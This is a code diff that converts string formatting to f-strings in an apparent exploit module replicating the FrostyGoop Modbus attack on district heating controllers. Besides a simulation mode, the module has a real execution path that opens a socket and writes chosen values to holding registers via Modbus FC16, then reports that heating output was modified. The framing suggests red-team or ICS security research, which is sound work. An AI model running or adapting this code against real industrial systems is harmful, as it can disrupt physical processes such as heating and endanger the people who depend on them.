@@ -119,27 +119,22 @@ class Exploit(Exploit):
             byte_count,
         ) + values_bytes
 
-        hex_payload = " ".join("{:02X}".format(b) for b in fc16_pdu)
+        hex_payload = " ".join(f"{b:02X}" for b in fc16_pdu)
 
         if self.simulate:
             print_warning("\n[FrostyGoop TTP] Lviv district heating attack replica\n")
             DestructiveGate.print_simulation(
                 description=(
-                    "FrostyGoop TTP: Would write value={} to {} holding register(s) "
-                    "starting at {} on {}:{} unit_id={} via Modbus FC16. "
+                    f"FrostyGoop TTP: Would write value={self.value} to {reg_count} holding register(s) "
+                    f"starting at {self.register_start} on {self.target}:{self.port} unit_id={self.unit_id} via Modbus FC16. "
                     "In the real Lviv attack (Jan 2024), this disabled heating for "
                     "~600 apartments during winter (-20°C). "
-                    "Attributed to Sandworm/GRU (BUSTLEBERM malware).".format(
-                        self.value, reg_count, self.register_start,
-                        self.target, self.port, self.unit_id
-                    )
+                    "Attributed to Sandworm/GRU (BUSTLEBERM malware)."
                 ),
                 payload_hex=hex_payload,
                 payload_human=(
                     "Modbus FC16 Write Multiple Registers: "
-                    "addr={} count={} value={}".format(
-                        self.register_start, reg_count, self.value
-                    )
+                    f"addr={self.register_start} count={reg_count} value={self.value}"
                 ),
                 mitre_techniques=[
                     "T0836 Modify Parameter",
@@ -151,9 +146,7 @@ class Exploit(Exploit):
 
         # Real execution path
         print_status(
-            "[FrostyGoop TTP] Writing {} to register {} on {}:{}…".format(
-                self.value, self.register_start, self.target, self.port
-            )
+            f"[FrostyGoop TTP] Writing {self.value} to register {self.register_start} on {self.target}:{self.port}…"
         )
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -165,12 +158,10 @@ class Exploit(Exploit):
 
             if len(resp) >= 8 and resp[7] == 0x10:
                 print_success(
-                    "FC16 Write accepted — {} register(s) at {} set to {}.".format(
-                        reg_count, self.register_start, self.value
-                    )
+                    f"FC16 Write accepted — {reg_count} register(s) at {self.register_start} set to {self.value}."
                 )
                 print_warning("Process impact: heating output modified. Operator intervention required.")
             else:
                 print_error("Unexpected response: {}".format(resp.hex() if resp else "empty"))
         except Exception as exc:
-            print_error("Error: {}".format(exc))
+            print_error(f"Error: {exc}")
